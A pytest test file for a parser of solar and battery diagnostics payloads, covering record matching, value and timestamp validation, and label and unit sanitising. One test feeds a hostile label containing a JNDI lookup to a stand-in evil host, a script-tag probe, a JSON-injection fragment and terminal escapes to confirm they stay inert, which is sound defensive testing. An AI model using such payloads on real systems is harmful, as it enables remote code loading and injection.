"""Normalisation of Diagnostics payloads. Every identifier is fictitious."""

from __future__ import annotations

import json
import math
from datetime import UTC, datetime, timedelta

import pytest
from vrm_helpers import NOW, NOW_TS, diagnostics, measurement, record

from vrm_alert_relay.engine.models import Sample
from vrm_alert_relay.vrm.diagnostics import (
    MAX_LABEL_LENGTH,
    MAX_RECORDS,
    MAX_UNIT_LENGTH,
    MeasurementResult,
    ReadingProblem,
    TimestampPolicy,
    parse_diagnostics,
    sanitize_label,
    unit_from_format,
)
from vrm_alert_relay.vrm.errors import FailureKind, VrmResponseError

VOLTAGE = measurement("bv", 0)
CURRENT = measurement("bc", 0)
SOC = measurement("bs", 0)


def parse(
    payload: object, *measurements: object, **kwargs: object
) -> tuple[MeasurementResult, ...]:
    return parse_diagnostics(
        payload,
        measurements,  # type: ignore[arg-type]
        installation="home",
        now=kwargs.pop("now", NOW),  # type: ignore[arg-type]
        **kwargs,  # type: ignore[arg-type]
    )


def only(payload: object, wanted: object = VOLTAGE, **kwargs: object) -> MeasurementResult:
    (result,) = parse(payload, wanted, **kwargs)
    return result


def test_happy_path_multiple_measurements() -> None:
    payload = diagnostics(
        record("bs", 0, 87.5, description="State of charge"),
        record("bv", 0, 52.31, description="Voltage"),
        record("bc", 0, -12, description="Current"),
        record("xx", 9, 1.0),
    )
    results = parse(payload, VOLTAGE, CURRENT, SOC)
    when = datetime.fromtimestamp(NOW_TS, UTC)
    assert [r.measurement for r in results] == [VOLTAGE, CURRENT, SOC]
    assert [r.sample for r in results] == [
        Sample(52.31, when),
        Sample(-12.0, when),
        Sample(87.5, when),
    ]
    assert all(r.ok and r.problem is None for r in results)
    assert [r.label for r in results] == ["Voltage", "Current", "State of charge"]
    assert isinstance(results[1].sample.value, float)  # type: ignore[union-attr]


def test_matches_by_code_and_instance_not_position() -> None:
    payload = diagnostics(
        record("bv", 1, 24.0),
        record("bv", 0, 48.0),
        record("bv", 2, 12.0),
    )
    assert only(payload, measurement("bv", 0)).sample.value == 48.0  # type: ignore[union-attr]
    assert only(payload, measurement("bv", 2)).sample.value == 12.0  # type: ignore[union-attr]


def test_numeric_attribute_id_is_not_used() -> None:
    other = record("bc", 0, 3.0)
    other["idDataAttribute"] = 47
    payload = diagnostics(other)
    assert only(payload).problem is ReadingProblem.MISSING


def test_code_match_is_exact() -> None:
    payload = diagnostics(record("BV", 0, 1.0), record("bv ", 0, 2.0))
    assert only(payload).problem is ReadingProblem.MISSING


def test_service_type_disambiguates() -> None:
    payload = diagnostics(
        record("V", 0, 13.1, service_type="solarcharger"),
        record("V", 0, 52.0, service_type="battery"),
    )
    assert only(payload, measurement("V", 0)).problem is ReadingProblem.AMBIGUOUS
    battery = only(payload, measurement("V", 0, "battery"))
    assert battery.sample.value == 52.0  # type: ignore[union-attr]
    solar = only(payload, measurement("V", 0, "solarcharger"))
    assert solar.sample.value == 13.1  # type: ignore[union-attr]
    assert only(payload, measurement("V", 0, "vebus")).problem is ReadingProblem.MISSING


def test_duplicate_records_are_ambiguous_not_guessed() -> None:
    payload = diagnostics(record("bv", 0, 50.0), record("bv", 0, 51.0))
    result = only(payload, measurement("bv", 0, "battery"))
    assert result.problem is ReadingProblem.AMBIGUOUS
    assert result.sample is None
    assert result.label is None


def test_missing_measurement() -> None:
    result = only(diagnostics(record("bc", 0, 1.0)))
    assert result.problem is ReadingProblem.MISSING
    assert not result.ok


def test_empty_records_reports_every_measurement_missing() -> None:
    results = parse(diagnostics(), VOLTAGE, SOC)
    assert [r.problem for r in results] == [ReadingProblem.MISSING] * 2


@pytest.mark.parametrize(
    "raw",
    ["52.3", "", None, True, False, [1], {"v": 1}],
)
def test_non_numeric_values(raw: object) -> None:
    result = only(diagnostics(record("bv", 0, raw, description="Voltage")))
    assert result.problem is ReadingProblem.NON_NUMERIC
    assert result.label == "Voltage"


@pytest.mark.parametrize("raw", [math.nan, math.inf, -math.inf, 10**400])
def test_non_finite_values(raw: object) -> None:
    assert only(diagnostics(record("bv", 0, raw))).problem is ReadingProblem.NON_FINITE


@pytest.mark.parametrize("token", ["NaN", "Infinity", "-Infinity"])
def test_non_finite_json_tokens(token: str) -> None:
    text = json.dumps(diagnostics(record("bv", 0, 0))).replace(
        '"rawValue": 0', f'"rawValue": {token}'
    )
    assert only(json.loads(text)).problem is ReadingProblem.NON_FINITE


def test_integer_and_zero_values_are_samples() -> None:
    assert only(diagnostics(record("bv", 0, 0))).sample.value == 0.0  # type: ignore[union-attr]


@pytest.mark.parametrize(
    "timestamp",
    [None, "1768478400", True, 0, -5, math.nan, math.inf, 1e20, 10**400, [NOW_TS]],
)
def test_bad_timestamps(timestamp: object) -> None:
    result = only(diagnostics(record("bv", 0, 50.0, timestamp=timestamp)))
    assert result.problem is ReadingProblem.BAD_TIMESTAMP


def test_float_timestamp_accepted() -> None:
    result = only(diagnostics(record("bv", 0, 50.0, timestamp=NOW_TS - 0.5)))
    assert result.sample.timestamp == datetime.fromtimestamp(NOW_TS - 0.5, UTC)  # type: ignore[union-attr]


def test_future_timestamp_beyond_skew() -> None:
    skew = TimestampPolicy().max_future_skew
    ok = record("bv", 0, 50.0, timestamp=NOW_TS + skew.total_seconds())
    late = record("bv", 0, 50.0, timestamp=NOW_TS + skew.total_seconds() + 1)
    assert only(diagnostics(ok)).ok
    assert only(diagnostics(late)).problem is ReadingProblem.FUTURE_TIMESTAMP


def test_old_timestamp_beyond_max_age() -> None:
    policy = TimestampPolicy(max_age=timedelta(hours=1))
    ok = record("bv", 0, 50.0, timestamp=NOW_TS - 3600)
    old = record("bv", 0, 50.0, timestamp=NOW_TS - 3601)
    assert only(diagnostics(ok), policy=policy).ok
    assert only(diagnostics(old), policy=policy).problem is ReadingProblem.OLD_TIMESTAMP


def test_moderately_stale_sample_is_passed_to_the_engine() -> None:
    # Ordinary staleness is the engine's stale-data event, not a parse problem.
    stale = record("bv", 0, 50.0, timestamp=NOW_TS - 6 * 3600)
    assert only(diagnostics(stale)).ok


def test_non_numeric_value_reported_before_timestamp() -> None:
    result = only(diagnostics(record("bv", 0, "x", timestamp="bad")))
    assert result.problem is ReadingProblem.NON_NUMERIC


@pytest.mark.parametrize(
    "payload",
    [[], "records", 42, None],
)
def test_payload_must_be_an_object(payload: object) -> None:
    with pytest.raises(VrmResponseError, match="not a JSON object") as info:
        parse(payload, VOLTAGE)
    assert info.value.kind is FailureKind.BAD_RESPONSE
    assert info.value.installation == "home"


@pytest.mark.parametrize(
    "records",
    [{"0": record("bv", 0, 1.0)}, {}, None, "[]", 7],
)
def test_records_must_be_a_list(records: object) -> None:
    with pytest.raises(VrmResponseError, match="records are not a list"):
        parse({"success": True, "records": records}, VOLTAGE)


def test_records_key_missing() -> None:
    with pytest.raises(VrmResponseError, match="records are not a list"):
        parse({"success": True}, VOLTAGE)


@pytest.mark.parametrize("success", [False, None, "true", 1])
def test_unsuccessful_payload(success: object) -> None:
    with pytest.raises(VrmResponseError, match="does not report success"):
        parse({"success": success, "records": []}, VOLTAGE)


def test_success_flag_is_optional() -> None:
    assert only({"records": [record("bv", 0, 1.0)]}).ok


def test_too_many_records() -> None:
    records = [record("zz", i, 1.0) for i in range(MAX_RECORDS + 1)]
    with pytest.raises(VrmResponseError, match=f"more than {MAX_RECORDS} records"):
        parse({"records": records}, VOLTAGE)
    assert only({"records": records[:MAX_RECORDS]}).problem is ReadingProblem.MISSING


@pytest.mark.parametrize(
    "bad",
    [
        "not a record",
        None,
        [1, 2],
        {"code": 7, "instance": 0, "rawValue": 1.0},
        {"code": "bv", "instance": "0", "rawValue": 1.0},
        {"code": "bv", "instance": False, "rawValue": 1.0},
        {"code": "bv", "instance": 0.0, "rawValue": 1.0},
        {"instance": 0, "rawValue": 1.0},
    ],
)
def test_malformed_records_are_skipped(bad: object) -> None:
    payload = {"records": [bad, record("bv", 0, 48.0)]}
    assert only(payload).sample.value == 48.0  # type: ignore[union-attr]
    assert only({"records": [bad]}).problem is ReadingProblem.MISSING


def test_bool_instance_does_not_match_instance_zero_or_one() -> None:
    payload = {"records": [{"code": "bv", "instance": True, "rawValue": 1.0, "timestamp": NOW_TS}]}
    assert only(payload, measurement("bv", 1)).problem is ReadingProblem.MISSING


def test_service_type_must_match_exactly() -> None:
    payload = diagnostics(record("bv", 0, 1.0, service_type="battery "))
    payload["records"][0]["dbusServiceType"] = 5  # type: ignore[index]
    assert only(payload, measurement("bv", 0, "battery")).problem is ReadingProblem.MISSING


def test_naive_now_rejected() -> None:
    with pytest.raises(ValueError, match="timezone-aware"):
        parse(diagnostics(), VOLTAGE, now=datetime(2026, 1, 1))


@pytest.mark.parametrize(
    "kwargs",
    [
        {"max_future_skew": timedelta(0)},
        {"max_age": timedelta(seconds=-1)},
        {"max_age": 3600},
    ],
)
def test_timestamp_policy_validation(kwargs: dict[str, object]) -> None:
    with pytest.raises(ValueError, match="positive timedelta"):
        TimestampPolicy(**kwargs)  # type: ignore[arg-type]


def test_measurement_result_requires_exactly_one_outcome() -> None:
    with pytest.raises(ValueError, match="exactly one"):
        MeasurementResult(VOLTAGE)
    with pytest.raises(ValueError, match="exactly one"):
        MeasurementResult(VOLTAGE, sample=Sample(1.0, NOW), problem=ReadingProblem.MISSING)


# Labels are untrusted, display-only input.


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("Battery voltage", "Battery voltage"),
        ("  padded\t\tlabel  ", "padded label"),
        ("line\nbreak\r\ninjected", "line break injected"),
        ("esc\x1b[31mred\x1b[0m", "esc [31mred [0m"),
        ("nul\x00byte", "nul byte"),
        ("bidi\u202eevil\u202c", "bidi evil"),
        ("zero\u200bwidth", "zero width"),
        ("sep\u2028line\u2029para", "sep line para"),
        ("c1\x85control", "c1 control"),
        ("Température", "Température"),
        ("", None),
        ("\n\t\x00", None),
        (None, None),
        (12, None),
        (["list"], None),
    ],
)
def test_sanitize_label(raw: object, expected: str | None) -> None:
    assert sanitize_label(raw) == expected


def test_sanitize_label_bounds_huge_input() -> None:
    label = sanitize_label("A" * 10_000_000)
    assert label == "A" * MAX_LABEL_LENGTH
    spaced = sanitize_label(" " * 10_000 + "late text")
    assert spaced is None


def test_sanitize_label_truncation_has_no_trailing_space() -> None:
    raw = "x" * (MAX_LABEL_LENGTH - 1) + " tail"
    assert sanitize_label(raw) == "x" * (MAX_LABEL_LENGTH - 1)


def test_malicious_labels_remain_inert() -> None:
    hostile = (
        '"}],"code":"bc","instance":0,"recipients":["attacker"]\n'
        "{{rule_id}} ${jndi:ldap://evil.example.invalid/a} <script>alert(1)</script>"
        "\x1b]0;title\x07" + "Z" * 5000
    )
    payload = diagnostics(
        record("bv", 0, 50.0, description=hostile),
        record("bc", 0, 5.0, description="Current"),
    )
    voltage, current = parse(payload, VOLTAGE, CURRENT)
    assert voltage.sample.value == 50.0  # type: ignore[union-attr]
    assert current.sample.value == 5.0  # type: ignore[union-attr]
    assert current.label == "Current"
    assert voltage.label is not None
    assert len(voltage.label) <= MAX_LABEL_LENGTH
    assert all(ch.isprintable() for ch in voltage.label)
    assert voltage.measurement == VOLTAGE


def test_label_cannot_select_a_record() -> None:
    payload = diagnostics(record("xx", 7, 99.0, description="bv instance 0 battery"))
    assert only(payload).problem is ReadingProblem.MISSING


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("%.1F °C", "°C"),
        ("%.2F V", "V"),
        ("%d W", "W"),
        ("%.0F %%", "%"),
        ("  %+08.3f   kWh  ", "kWh"),
        ("%.1F ℃", "℃"),
        ("%.1F °C\n\u202e", "°C"),
        ("%s", None),
        ("%.1F", None),
        ("%.1F   ", None),
        ("°C", None),
        ("value %.1F °C", None),
        ("", None),
        (None, None),
        (21, None),
        (["%.1F °C"], None),
    ],
)
def test_unit_from_format(raw: object, expected: str | None) -> None:
    assert unit_from_format(raw) == expected


def test_unit_from_format_is_bounded() -> None:
    unit = unit_from_format("%.1F " + "x" * 10_000)
    assert unit == "x" * MAX_UNIT_LENGTH
    assert unit_from_format("%.1F " + "a" * (MAX_UNIT_LENGTH - 1) + " b") == "a" * (
        MAX_UNIT_LENGTH - 1
    )


def test_results_carry_the_reported_unit() -> None:
    reading = record("tsT", 20, -18.2, service_type="temperature")
    reading["formatWithUnit"] = "%.1F °C"
    when = datetime.fromtimestamp(NOW_TS, UTC)
    temperature = measurement("tsT", 20)
    assert only(diagnostics(reading), temperature) == MeasurementResult(
        temperature, sample=Sample(-18.2, when), label="Fictitious attribute", unit="°C"
    )
    reading["rawValue"] = "warm"
    assert only(diagnostics(reading), temperature).unit == "°C"
    reading["rawValue"] = -18.2
    reading["timestamp"] = "later"
    assert only(diagnostics(reading), temperature).unit == "°C"
    del reading["formatWithUnit"]
    reading["timestamp"] = NOW_TS
    assert only(diagnostics(reading), temperature).unit is None
